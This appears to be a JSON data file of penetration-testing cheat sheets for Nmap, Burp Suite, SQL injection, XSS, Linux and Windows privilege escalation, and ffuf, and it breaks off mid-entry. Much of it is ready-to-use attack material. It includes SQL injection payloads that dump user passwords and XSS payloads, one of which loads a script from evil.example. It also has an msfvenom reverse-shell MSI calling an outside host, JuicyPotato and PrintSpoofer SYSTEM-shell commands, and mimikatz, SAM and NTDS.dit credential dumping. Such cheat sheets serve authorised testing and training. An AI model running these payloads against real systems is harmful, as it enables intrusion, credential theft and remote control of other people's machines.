+ {
+  "description": "Host discovery, scan types, timing tricks, output formats, and NSE scripts for fast and effective Nmap scanning.",
+  "sections": [
+   {
+    "heading": "Host Discovery",
+    "rows": [
+     {
+      "command": "nmap -sn 192.168.1.0/24",
+      "description": "Ping sweep to find live hosts on a subnet"
+     },
+     {
+      "command": "nmap -Pn target.com",
+      "description": "Skip host discovery and treat the host as online"
+     },
+     {
+      "command": "nmap -PS80,443 192.168.1.0/24",
+      "description": "TCP SYN ping on ports 80 and 443"
+     },
+     {
+      "command": "nmap -PE 192.168.1.0/24",
+      "description": "ICMP echo ping sweep across the subnet"
+     },
+     {
+      "command": "nmap -sn --traceroute 192.168.1.0/24",
+      "description": "Host discovery plus route tracing to each host"
+     },
+     {
+      "command": "nmap -iL targets.txt -sn",
+      "description": "Discover hosts listed in a text file"
+     }
+    ]
+   },
+   {
+    "heading": "Port Scan Types",
+    "rows": [
+     {
+      "command": "nmap -sS target.com",
+      "description": "TCP SYN scan, fast and stealthy"
+     },
+     {
+      "command": "nmap -sT target.com",
+      "description": "Full TCP connect scan, works without root"
+     },
+     {
+      "command": "nmap -sU --top-ports 100 target.com",
+      "description": "Scan the top 100 UDP ports"
+     },
+     {
+      "command": "nmap -sV target.com",
+      "description": "Detect service versions on open ports"
+     },
+     {
+      "command": "nmap -O target.com",
+      "description": "Guess the operating system of the target"
+     },
+     {
+      "command": "nmap -sA target.com",
+      "description": "ACK scan to map firewall filtering rules"
+     },
+     {
+      "command": "nmap -sV -O -sC target.com",
+      "description": "Versions, OS guess, and default scripts combined"
+     }
+    ]
+   },
+   {
+    "heading": "Timing and Speed",
+    "rows": [
+     {
+      "command": "nmap -T4 target.com",
+      "description": "Aggressive timing template for faster scans"
+     },
+     {
+      "command": "nmap --min-rate 5000 target.com",
+      "description": "Send at least 5000 packets per second"
+     },
+     {
+      "command": "nmap -p- target.com",
+      "description": "Scan all 65535 TCP ports"
+     },
+     {
+      "command": "nmap --top-ports 100 target.com",
+      "description": "Scan only the 100 most common ports"
+     },
+     {
+      "command": "nmap -n target.com",
+      "description": "Skip DNS resolution to speed things up"
+     },
+     {
+      "command": "nmap --max-retries 1 target.com",
+      "description": "Retry each probe only once"
+     }
+    ]
+   },
+   {
+    "heading": "Output Formats",
+    "rows": [
+     {
+      "command": "nmap -oN scan.txt target.com",
+      "description": "Save normal readable output to a file"
+     },
+     {
+      "command": "nmap -oX scan.xml target.com",
+      "description": "Save machine readable XML output"
+     },
+     {
+      "command": "nmap -oA myscan target.com",
+      "description": "Save normal, XML, and grepable formats at once"
+     },
+     {
+      "command": "nmap -v target.com",
+      "description": "Verbose mode to watch progress live"
+     },
+     {
+      "command": "nmap --stats-every 10s target.com",
+      "description": "Print progress stats every 10 seconds"
+     }
+    ]
+   },
+   {
+    "heading": "NSE Script Basics",
+    "rows": [
+     {
+      "command": "nmap -sC target.com",
+      "description": "Run the default safe script set"
+     },
+     {
+      "command": "nmap --script vuln target.com",
+      "description": "Check for known vulnerabilities with scripts"
+     },
+     {
+      "command": "nmap --script http-title -p80,443 target.com",
+      "description": "Grab web page titles from open web ports"
+     },
+     {
+      "command": "nmap --script smb-os-discovery target.com",
+      "description": "Identify Windows hosts through SMB"
+     },
+     {
+      "command": "nmap --script-args user=admin,pass=secret target.com",
+      "description": "Pass arguments into NSE scripts"
+     },
+     {
+      "command": "nmap -sV --script=banner -p22 target.com",
+      "description": "Grab the SSH banner using a script"
+     },
+     {
+      "command": "nmap --script-updatedb",
+      "description": "Refresh the local NSE script database"
+     }
+    ]
+   }
+  ],
+  "slug": "nmap-scanning",
+  "title": "Nmap Scanning"
+ },
+ {
+  "description": "Daily Burp Suite workflow: proxy setup, Repeater, Intruder, Decoder, Comparer, and the shortcuts that save time.",
+  "sections": [
+   {
+    "heading": "Proxy Setup",
+    "rows": [
+     {
+      "command": "Proxy > Intercept is on",
+      "description": "Toggle interception of browser traffic"
+     },
+     {
+      "command": "Proxy > HTTP history",
+      "description": "Review every request and response captured"
+     },
+     {
+      "command": "http://burpsuite",
+      "description": "Open in the built-in browser to fetch the CA cert"
+     },
+     {
+      "command": "Proxy > Options > Import / export CA certificate",
+      "description": "Install the Burp CA so HTTPS traffic decrypts"
+     },
+     {
+      "command": "Target > Scope > Add",
+      "description": "Limit the sitemap and tools to in-scope hosts"
+     },
+     {
+      "command": "Proxy > HTTP history > Filter",
+      "description": "Show only in-scope or interesting traffic"
+     }
+    ]
+   },
+   {
+    "heading": "Repeater",
+    "rows": [
+     {
+      "command": "Ctrl+R",
+      "description": "Send the selected request to Repeater"
+     },
+     {
+      "command": "Repeater > Send",
+      "description": "Fire the edited request and read the response"
+     },
+     {
+      "command": "Repeater > Inspector",
+      "description": "View headers, params, and cookies in a panel"
+     },
+     {
+      "command": "Repeater > Render",
+      "description": "Preview how the response renders in a browser"
+     },
+     {
+      "command": "Repeater > New tab",
+      "description": "Keep multiple request variants side by side"
+     },
+     {
+      "command": "Ctrl+F",
+      "description": "Search inside the request or response editor"
+     }
+    ]
+   },
+   {
+    "heading": "Intruder",
+    "rows": [
+     {
+      "command": "Ctrl+I",
+      "description": "Send the selected request to Intruder"
+     },
+     {
+      "command": "Intruder > Positions > Add",
+      "description": "Mark payload insertion points with section signs"
+     },
+     {
+      "command": "Attack type: Sniper",
+      "description": "Try each payload in each position one at a time"
+     },
+     {
+      "command": "Attack type: Cluster bomb",
+      "description": "Try every combination of payloads across positions"
+     },
+     {
+      "command": "Intruder > Payloads > Load",
+      "description": "Load a wordlist file as the payload set"
+     },
+     {
+      "command": "Intruder > Options > Grep - Match",
+      "description": "Flag responses containing a keyword"
+     },
+     {
+      "command": "Intruder > Start attack",
+      "description": "Launch the attack and sort results by length or status"
+     }
+    ]
+   },
+   {
+    "heading": "Decoder",
+    "rows": [
+     {
+      "command": "Decoder > Decode as > URL",
+      "description": "Decode percent-encoded strings"
+     },
+     {
+      "command": "Decoder > Decode as > Base64",
+      "description": "Decode Base64 blobs"
+     },
+     {
+      "command": "Decoder > Decode as > HTML",
+      "description": "Decode HTML entities"
+     },
+     {
+      "command": "Decoder > Smart decode",
+      "description": "Auto-detect the encoding of pasted text"
+     },
+     {
+      "command": "Decoder > Hash > SHA-256",
+      "description": "Hash text to compare values quickly"
+     }
+    ]
+   },
+   {
+    "heading": "Comparer",
+    "rows": [
+     {
+      "command": "Ctrl+Shift+D",
+      "description": "Send selected data to Comparer"
+     },
+     {
+      "command": "Comparer > Words",
+      "description": "Compare two items word by word"
+     },
+     {
+      "command": "Comparer > Bytes",
+      "description": "Compare two items byte by byte"
+     },
+     {
+      "command": "Comparer > Load",
+      "description": "Paste or load items to compare manually"
+     },
+     {
+      "command": "Comparer > Sync views",
+      "description": "Scroll both compared items together"
+     }
+    ]
+   },
+   {
+    "heading": "Shortcuts and Quick Wins",
+    "rows": [
+     {
+      "command": "Ctrl+R",
+      "description": "Send request to Repeater"
+     },
+     {
+      "command": "Ctrl+I",
+      "description": "Send request to Intruder"
+     },
+     {
+      "command": "Ctrl+Shift+D",
+      "description": "Send data to Comparer"
+     },
+     {
+      "command": "Ctrl+F",
+      "description": "Search inside the current editor"
+     },
+     {
+      "command": "Right-click > Send to",
+      "description": "Route requests between any Burp tools"
+     },
+     {
+      "command": "Proxy > Intercept > Open browser",
+      "description": "Launch Burp's built-in Chromium browser"
+     }
+    ]
+   }
+  ],
+  "slug": "burp-suite-pro",
+  "title": "Burp Suite Daily Use"
+ },
+ {
+  "description": "Payloads and techniques for finding and exploiting SQL injection: detection, UNION-based, error-based, time-based, and handy functions for each database.",
+  "sections": [
+   {
+    "heading": "Detection Payloads",
+    "rows": [
+     {
+      "command": "'",
+      "description": "Break out of a string and trigger a database error"
+     },
+     {
+      "command": "' OR '1'='1",
+      "description": "Always-true condition for string contexts"
+     },
+     {
+      "command": "\" OR \"1\"=\"1",
+      "description": "Classic always-true test for login forms"
+     },
+     {
+      "command": "1' OR '1'='1' -- -",
+      "description": "Comment out the rest of the query"
+     },
+     {
+      "command": "') OR ('1'='1",
+      "description": "Test when input sits inside parentheses"
+     },
+     {
+      "command": "\\",
+      "description": "Backslash to test how escaping behaves"
+     },
+     {
+      "command": "1 AND 1=1",
+      "description": "True condition to compare against a false one"
+     }
+    ]
+   },
+   {
+    "heading": "UNION-Based",
+    "rows": [
+     {
+      "command": "' ORDER BY 5-- -",
+      "description": "Raise the number until an error reveals the column count"
+     },
+     {
+      "command": "' UNION SELECT NULL,NULL,NULL-- -",
+      "description": "Match the column count with NULL placeholders"
+     },
+     {
+      "command": "' UNION SELECT 1,2,3-- -",
+      "description": "Find which columns render in the page"
+     },
+     {
+      "command": "' UNION SELECT 1,@@version,3-- -",
+      "description": "Pull the database version into the output"
+     },
+     {
+      "command": "' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -",
+      "description": "List tables in MySQL"
+     },
+     {
+      "command": "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -",
+      "description": "List columns of one table"
+     },
+     {
+      "command": "' UNION SELECT 1,concat(user,0x3a,password),3 FROM users-- -",
+      "description": "Dump usernames and passwords in one row"
+     }
+    ]
+   },
+   {
+    "heading": "Error-Based",
+    "rows": [
+     {
+      "command": "' AND extractvalue(1,concat(0x7e,version()))-- -",
+      "description": "MySQL error message leaks the version"
+     },
+     {
+      "command": "' AND updatexml(1,concat(0x7e,version()),1)-- -",
+      "description": "Another MySQL error-based leak trick"
+     },
+     {
+      "command": "' AND 1=CAST((SELECT version()) AS INT)-- -",
+      "description": "Force a type error in PostgreSQL"
+     },
+     {
+      "command": "' AND 1=CONVERT(INT,@@version)-- -",
+      "description": "Force a type error in MSSQL"
+     },
+     {
+      "command": "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))-- -",
+      "description": "Oracle error-based data exfiltration"
+     },
+     {
+      "command": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -",
+      "description": "MySQL double-query error trick"
+     }
+    ]
+   },
+   {
+    "heading": "Time-Based Blind",
+    "rows": [
+     {
+      "command": "' AND SLEEP(5)-- -",
+      "description": "MySQL delays five seconds if injectable"
+     },
+     {
+      "command": "1' AND IF(1=1,SLEEP(5),0)-- -",
+      "description": "MySQL conditional delay test"
+     },
+     {
+      "command": "'; SELECT pg_sleep(5)-- -",
+      "description": "PostgreSQL delay test"
+     },
+     {
+      "command": "' OR 1=1; WAITFOR DELAY '0:0:5'-- -",
+      "description": "MSSQL delay test"
+     },
+     {
+      "command": "' UNION SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -",
+      "description": "PostgreSQL conditional delay in a UNION"
+     },
+     {
+      "command": "' AND (SELECT * FROM (SELECT(SLEEP(5)))x)-- -",
+      "description": "Alternative MySQL delay shape"
+     }
+    ]
+   },
+   {
+    "heading": "Handy Functions per DBMS",
+    "rows": [
+     {
+      "command": "version()",
+      "description": "MySQL and PostgreSQL database version"
+     },
+     {
+      "command": "database()",
+      "description": "MySQL current database name"
+     },
+     {
+      "command": "user()",
+      "description": "MySQL current database user"
+     },
+     {
+      "command": "current_database()",
+      "description": "PostgreSQL current database name"
+     },
+     {
+      "command": "@@version",
+      "description": "MSSQL server version string"
+     },
+     {
+      "command": "DB_NAME()",
+      "description": "MSSQL current database name"
+     },
+     {
+      "command": "(SELECT banner FROM v$version)",
+      "description": "Oracle version banner"
+     }
+    ]
+   },
+   {
+    "heading": "Comments and Bypasses",
+    "rows": [
+     {
+      "command": "-- -",
+      "description": "SQL comment that drops the rest of the query"
+     },
+     {
+      "command": "/**/",
+      "description": "Inline comment that can replace spaces"
+     },
+     {
+      "command": "#",
+      "description": "MySQL comment to end of line"
+     },
+     {
+      "command": "0x414141",
+      "description": "Hex literal to avoid using quotes"
+     },
+     {
+      "command": "CHAR(65,66,67)",
+      "description": "Build strings from character codes"
+     }
+    ]
+   }
+  ],
+  "slug": "sql-injection-testing",
+  "title": "SQL Injection Testing"
+ },
+ {
+  "description": "Cross-site scripting payloads for every context: breaking out of HTML, event handlers, filter bypasses, and notes on Content Security Policy.",
+  "sections": [
+   {
+    "heading": "Basic Script Context",
+    "rows": [
+     {
+      "command": "<script>alert(1)</script>",
+      "description": "Classic reflected XSS test"
+     },
+     {
+      "command": "<script>alert(document.domain)</script>",
+      "description": "Prove which domain the script runs in"
+     },
+     {
+      "command": "<script>prompt(1)</script>",
+      "description": "Alternative dialog for testing"
+     },
+     {
+      "command": "<script>console.log(1337)</script>",
+      "description": "Silent test that leaves no popup"
+     },
+     {
+      "command": "</script><script>alert(1)</script>",
+      "description": "Break out of an existing script block"
+     },
+     {
+      "command": "<script src=https://evil.example/x.js></script>",
+      "description": "Load an external script file"
+     }
+    ]
+   },
+   {
+    "heading": "Breaking Out of Attributes",
+    "rows": [
+     {
+      "command": "\"><script>alert(1)</script>",
+      "description": "Close the attribute and tag, then inject"
+     },
+     {
+      "command": "\" onmouseover=\"alert(1)",
+      "description": "Inject an event into a quoted attribute"
+     },
+     {
+      "command": "'\"><img src=x onerror=alert(1)>",
+      "description": "Close the tag early with an image error handler"
+     },
+     {
+      "command": "</textarea><script>alert(1)</script>",
+      "description": "Escape a textarea block"
+     },
+     {
+      "command": "</title><script>alert(1)</script>",
+      "description": "Escape a title block"
+     },
+     {
+      "command": "\" autofocus onfocus=\"alert(1)",
+      "description": "Fire on focus without user clicks"
+     }
+    ]
+   },
+   {
+    "heading": "Event Handlers",
+    "rows": [
+     {
+      "command": "<img src=x onerror=alert(1)>",
+      "description": "Error event on a broken image"
+     },
+     {
+      "command": "<svg onload=alert(1)>",
+      "description": "Load event on an SVG element"
+     },
+     {
+      "command": "<body onload=alert(1)>",
+      "description": "Load event on the page body"
+     },
+     {
+      "command": "<details open ontoggle=alert(1)>",
+      "description": "Toggle event fires automatically when open"
+     },
+     {
+      "command": "<a href=javascript:alert(1)>click</a>",
+      "description": "JavaScript URL inside a link"
+     },
+     {
+      "command": "<input onfocus=alert(1) autofocus>",
+      "description": "Focus event triggered by autofocus"
+     },
+     {
+      "command": "<video><source onerror=alert(1)>",
+      "description": "Error event on a media source"
+     }
+    ]
+   },
+   {
+    "heading": "Filter Bypasses",
+    "rows": [
+     {
+      "command": "<ScRiPt>alert(1)</ScRiPt>",
+      "description": "Mixed case to beat naive filters"
+     },
+     {
+      "command": "<scr<script>ipt>alert(1)</scr<script>ipt>",
+      "description": "Nested tags survive strip-once filters"
+     },
+     {
+      "command": "<img src=x onerror=alert`1`>",
+      "description": "Backticks avoid parentheses"
+     },
+     {
+      "command": "<svg/onload=alert(1)>",
+      "description": "Slash replaces the space before the handler"
+     },
+     {
+      "command": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+      "description": "Entity-encoded handler name"
+     },
+     {
+      "command": "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
+      "description": "Build the payload from character codes"
+     },
+     {
+      "command": "<iframe srcdoc=\"<script>alert(parent.document.domain)</script>\">",
+      "description": "Script inside an iframe srcdoc attribute"
+     }
+    ]
+   },
+   {
+    "heading": "CSP Notes",
+    "rows": [
+     {
+      "command": "curl -sI https://target.com | grep -i content-security-policy",
+      "description": "Check whether a CSP header exists"
+     },
+     {
+      "command": "default-src 'self'",
+      "description": "CSP that blocks inline scripts and outside sources"
+     },
+     {
+      "command": "script-src 'nonce-r4nd0m'",
+      "description": "Only scripts with the matching nonce run"
+     },
+     {
+      "command": "<script src=/api/jsonp?callback=alert></script>",
+      "description": "JSONP endpoints can bypass script-src rules"
+     },
+     {
+      "command": "'unsafe-inline'",
+      "description": "CSP value that allows inline scripts again"
+     },
+     {
+      "command": "Content-Security-Policy-Report-Only",
+      "description": "Header that logs violations without blocking"
+     }
+    ]
+   }
+  ],
+  "slug": "xss-payloads",
+  "title": "XSS Payloads"
+ },
+ {
+  "description": "Enumeration and exploitation commands for Linux privilege escalation: SUID binaries, sudo misconfigurations, cron jobs, kernel bugs, and credential hunting.",
+  "sections": [
+   {
+    "heading": "Quick Enumeration",
+    "rows": [
+     {
+      "command": "id",
+      "description": "Show your user, groups, and numeric IDs"
+     },
+     {
+      "command": "whoami",
+      "description": "Confirm your current username"
+     },
+     {
+      "command": "uname -a",
+      "description": "Kernel version and architecture"
+     },
+     {
+      "command": "cat /etc/os-release",
+      "description": "Distribution name and version"
+     },
+     {
+      "command": "ps aux",
+      "description": "List all running processes"
+     },
+     {
+      "command": "ss -tuln",
+      "description": "Show listening ports and services"
+     },
+     {
+      "command": "env",
+      "description": "Dump environment variables for secrets"
+     }
+    ]
+   },
+   {
+    "heading": "SUID and Capabilities",
+    "rows": [
+     {
+      "command": "find / -perm -4000 -type f 2>/dev/null",
+      "description": "List every SUID binary on the system"
+     },
+     {
+      "command": "find / -perm -2000 -type f 2>/dev/null",
+      "description": "List SGID binaries as well"
+     },
+     {
+      "command": "getcap -r / 2>/dev/null",
+      "description": "Find binaries with Linux capabilities set"
+     },
+     {
+      "command": "ls -la /usr/bin/vim",
+      "description": "Check whether an editor carries the SUID bit"
+     },
+     {
+      "command": "find / -perm -4000 -type f -newer /etc/passwd 2>/dev/null",
+      "description": "SUID binaries newer than the passwd file"
+     }
+    ]
+   },
+   {
+    "heading": "Sudo Misconfigurations",
+    "rows": [
+     {
+      "command": "sudo -l",
+      "description": "List commands you may run as root"
+     },
+     {
+      "command": "sudo --version",
+      "description": "Check for old sudo versions with known bugs"
+     },
+     {
+      "command": "sudo -u#-1 id",
+      "description": "Test the CVE-2019-14287 sudo bypass"
+     },
+     {
+      "command": "grep -R \"NOPASSWD\" /etc/sudoers.d/ 2>/dev/null",
+      "description": "Find passwordless sudo rules"
+     },
+     {
+      "command": "cat /etc/sudoers 2>/dev/null",
+      "description": "Read the sudoers file if permissions allow"
+     },
+     {
+      "command": "ls -la /etc/sudoers.d/",
+      "description": "List extra sudoers rule files"
+     }
+    ]
+   },
+   {
+    "heading": "Cron Jobs",
+    "rows": [
+     {
+      "command": "cat /etc/crontab",
+      "description": "Read the system cron table"
+     },
+     {
+      "command": "ls -la /etc/cron.d/ /etc/cron.daily/",
+      "description": "List cron directories and their owners"
+     },
+     {
+      "command": "crontab -l",
+      "description": "Show your own user's cron jobs"
+     },
+     {
+      "command": "cat /var/spool/cron/crontabs/* 2>/dev/null",
+      "description": "Read every user's cron file"
+     },
+     {
+      "command": "systemctl list-timers",
+      "description": "Show systemd timers that replace cron"
+     },
+     {
+      "command": "find /etc/cron* -writable -type f 2>/dev/null",
+      "description": "Find cron files you can modify"
+     }
+    ]
+   },
+   {
+    "heading": "Kernel Exploits",
+    "rows": [
+     {
+      "command": "uname -r",
+      "description": "Exact kernel release for exploit matching"
+     },
+     {
+      "command": "cat /proc/version",
+      "description": "Kernel build details"
+     },
+     {
+      "command": "ls /boot",
+      "description": "Installed kernels and config files"
+     },
+     {
+      "command": "gcc --version",
+      "description": "Check whether a compiler exists for exploits"
+     },
+     {
+      "command": "searchsploit kernel 5.4",
+      "description": "Search local exploits for a kernel version"
+     }
+    ]
+   },
+   {
+    "heading": "Credential Hunting",
+    "rows": [
+     {
+      "command": "cat ~/.bash_history",
+      "description": "Commands that may contain typed passwords"
+     },
+     {
+      "command": "history | grep -i pass",
+      "description": "Search shell history for passwords"
+     },
+     {
+      "command": "find / -name \"*.bak\" -o -name \"*password*\" 2>/dev/null | head -20",
+      "description": "Hunt backup and password files"
+     },
+     {
+      "command": "grep -ri \"password\" /var/www 2>/dev/null | head -20",
+      "description": "Search web roots for credentials"
+     },
+     {
+      "command": "ls -la /home/*/.ssh/ 2>/dev/null",
+      "description": "Check SSH keys of other users"
+     },
+     {
+      "command": "cat /etc/passwd",
+      "description": "List users and their login shells"
+     }
+    ]
+   }
+  ],
+  "slug": "linux-privilege-escalation",
+  "title": "Linux Privilege Escalation"
+ },
+ {
+  "description": "Windows privilege escalation commands: local enumeration, service misconfigurations, AlwaysInstallElevated, token privileges, and credential dumping.",
+  "sections": [
+   {
+    "heading": "Local Enumeration",
+    "rows": [
+     {
+      "command": "whoami /all",
+      "description": "User, groups, and privileges in one view"
+     },
+     {
+      "command": "systeminfo",
+      "description": "OS version, patches, and uptime"
+     },
+     {
+      "command": "net user",
+      "description": "List local user accounts"
+     },
+     {
+      "command": "net localgroup administrators",
+      "description": "List local administrators"
+     },
+     {
+      "command": "tasklist /svc",
+      "description": "Processes mapped to their services"
+     },
+     {
+      "command": "wmic qfe list brief",
+      "description": "Installed patches and hotfixes"
+     },
+     {
+      "command": "ipconfig /all",
+      "description": "Network config and DNS servers"
+     }
+    ]
+   },
+   {
+    "heading": "Service Misconfigurations",
+    "rows": [
+     {
+      "command": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\"",
+      "description": "Find auto-start services with unquoted paths"
+     },
+     {
+      "command": "sc qc <service>",
+      "description": "Show a service binary path and config"
+     },
+     {
+      "command": "sc query state= all",
+      "description": "List every service and its state"
+     },
+     {
+      "command": "icacls \"C:\\Program Files\\Vuln App\\app.exe\"",
+      "description": "Check write access on a service binary"
+     },
+     {
+      "command": "powershell \"Get-Acl 'C:\\Program Files\\Vuln' | Format-List\"",
+      "description": "Check folder permissions with PowerShell"
+     },
+     {
+      "command": "wmic service get name,pathname,startmode | findstr /i \"auto\"",
+      "description": "List auto-start services and their paths"
+     }
+    ]
+   },
+   {
+    "heading": "AlwaysInstallElevated",
+    "rows": [
+     {
+      "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+      "description": "Check the user policy key"
+     },
+     {
+      "command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+      "description": "Check the machine policy key"
+     },
+     {
+      "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f msi -o evil.msi",
+      "description": "Build a malicious MSI payload"
+     },
+     {
+      "command": "msiexec /quiet /qn /i C:\\temp\\evil.msi",
+      "description": "Install the MSI with elevated rights"
+     },
+     {
+      "command": "msiexec /quiet /qn /i C:\\temp\\evil.msi /log C:\\temp\\install.log",
+      "description": "Same install with a log file for debugging"
+     }
+    ]
+   },
+   {
+    "heading": "Token Privileges",
+    "rows": [
+     {
+      "command": "whoami /priv",
+      "description": "List your current token privileges"
+     },
+     {
+      "command": "whoami /groups",
+      "description": "Groups and their enabled status"
+     },
+     {
+      "command": "JuicyPotato.exe -l 1337 -p C:\\windows\\system32\\cmd.exe -t * -c {CLSID}",
+      "description": "Abuse SeImpersonatePrivilege for a SYSTEM shell"
+     },
+     {
+      "command": "PrintSpoofer64.exe -c \"whoami\"",
+      "description": "Test SeImpersonatePrivilege with PrintSpoofer"
+     },
+     {
+      "command": "whoami /priv | findstr /i \"SeImpersonate SeAssignPrimaryToken\"",
+      "description": "Check for the two juicy impersonation privileges"
+     }
+    ]
+   },
+   {
+    "heading": "Credential Dumping",
+    "rows": [
+     {
+      "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
+      "description": "Dump plaintext passwords from LSASS"
+     },
+     {
+      "command": "mimikatz.exe \"privilege::debug\" \"lsadump::sam\" \"exit\"",
+      "description": "Dump SAM password hashes"
+     },
+     {
+      "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::wdigest\" \"exit\"",
+      "description": "Dump WDigest credentials"
+     },
+     {
+      "command": "reg save HKLM\\SAM sam.hive",
+      "description": "Save the SAM hive to disk"
+     },
+     {
+      "command": "reg save HKLM\\SYSTEM system.hive",
+      "description": "Save the SYSTEM hive for the bootkey"
+     },
+     {
+      "command": "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q",
+      "description": "Dump NTDS.dit on a domain controller"
+     }
+    ]
+   },
+   {
+    "heading": "Quick Win Checks",
+    "rows": [
+     {
+      "command": "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
+      "description": "Read PowerShell command history"
+     },
+     {
+      "command": "findstr /si password C:\\*.xml C:\\*.ini C:\\*.txt 2>nul",
+      "description": "Search config files for passwords"
+     },
+     {
+      "command": "schtasks /query /fo LIST /v",
+      "description": "List scheduled tasks in full detail"
+     },
+     {
+      "command": "wmic startup get caption,command",
+      "description": "Show programs that run at startup"
+     },
+     {
+      "command": "netstat -ano",
+      "description": "Listening ports that may hide local services"
+     }
+    ]
+   }
+  ],
+  "slug": "windows-privilege-escalation",
+  "title": "Windows Privilege Escalation"
+ },
+ {
+  "description": "Content discovery with ffuf: directory brute forcing, virtual host fuzzing, parameter discovery, filters, and multi-wordlist attacks.",
+  "sections": [
+   {
+    "heading": "Directory Fuzzing",
+    "rows": [
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt",
+      "description": "Fuzz paths on the web root"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.html,.bak",
+      "description": "Add extensions to each guess"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -recursion",
+      "description": "Recurse into discovered directories"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -recursion-depth 2",
+      "description": "Limit how deep recursion goes"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -t 50",
+      "description": "Use 50 threads for speed"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -r",
+      "description": "Follow redirects automatically"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -H \"User-Agent: Mozilla/5.0\"",
+      "description": "Set a custom user agent header"
+     }
+    ]
+   },
+   {
+    "heading": "Vhost Fuzzing",
+    "rows": [
+     {
+      "command": "ffuf -u https://10.10.10.10 -w subdomains.txt -H \"Host: FUZZ.target.com\"",
+      "description": "Fuzz virtual hosts on one IP address"
+     },
+     {
+      "command": "ffuf -u https://10.10.10.10 -w subdomains.txt -H \"Host: FUZZ.target.com\" -fs 1234",
+      "description": "Filter out the default response size"
+     },
+     {
+      "command": "ffuf -u http://target.com -w subdomains.txt -H \"Host: FUZZ.target.com\" -mc 200",
+      "description": "Keep only 200 OK responses"
+     },
+     {
+      "command": "ffuf -u https://target.com -w subdomains.txt -H \"Host: FUZZ.target.com\" -fc 404",
+      "description": "Hide not-found responses"
+     },
+     {
+      "command": "ffuf -u https://target.com -w subdomains.txt -H \"Host: FUZZ.target.com\" -fw 12",
+      "description": "Hide responses with 12 words"
+     }
+    ]
+   },
+   {
+    "heading": "Parameter Fuzzing",
+    "rows": [
+     {
+      "command": "ffuf -u \"https://target.com/page?FUZZ=test\" -w params.txt",
+      "description": "Fuzz GET parameter names"
+     },
+     {
+      "command": "ffuf -u \"https://target.com/page?FUZZ=test\" -w params.txt -fs 100",
+      "description": "Filter the baseline response size"
+     },
+     {
+      "command": "ffuf -u https://target.com/login -X POST -d \"FUZZ=test\" -w params.txt",
+      "description": "Fuzz POST parameter names"
+     },
+     {
+      "command": "ffuf -u https://target.com/ -w headers.txt -H \"FUZZ: test\"",
+      "description": "Fuzz custom header names"
+     },
+     {
+      "command": "ffuf -u \"https://target.com/page?FUZZ=test\" -w params.txt -mc 200,500",
+      "description": "Show only 200 and 500 responses"
+     }
+    ]
+   },
+   {
+    "heading": "Filters and Matchers",
+    "rows": [
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404",
+      "description": "Hide 404 status codes"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -fs 5123",
+      "description": "Hide responses of 5123 bytes"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -fw 10",
+      "description": "Hide responses with 10 words"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -fl 5",
+      "description": "Hide responses with 5 lines"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302",
+      "description": "Show only these status codes"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -mr \"admin\"",
+      "description": "Show only responses matching a regex"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -s",
+      "description": "Silent mode, results only"
+     }
+    ]
+   },
+   {
+    "heading": "Multi-Wordlist Attacks",
+    "rows": [
+     {
+      "command": "ffuf -w users.txt:FUZZUSER -w passes.txt:FUZZPASS -u https://target.com/login -X POST -d \"user=FUZZUSER&pass=FUZZPASS\" -mode clusterbomb",
+      "description": "Try every user with every password"
+     },
+     {
+      "command": "ffuf -w users.txt:FUZZUSER -w passes.txt:FUZZPASS -u https://target.com/login -X POST -d \"user=FUZZUSER&pass=FUZZPASS\" -mode pitchfork",
+      "description": "Pair wordlists line by line instead"
+     },
+     {
+      "command": "ffuf -w dirs.txt:DIR -w exts.txt:EXT -u https://target.com/DIR.EXT",
+      "description": "Combine directory and extension wordlists"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -x http://127.0.0.1:8080",
+      "description": "Send all requests through Burp proxy"
+     },
+     {
+      "command": "ffuf -w seclists.txt:FF -u https://target.com/FF -recursion",
+      "description": "Use a SecLists wordlist with recursion"
+     }
+    ]
+   },
+   {
+    "heading": "Output and Tuning",
+    "rows": [
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -o results.json -of json",
+      "description": "Save results as JSON"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -o results.csv -of csv",
+      "description": "Save results as CSV"
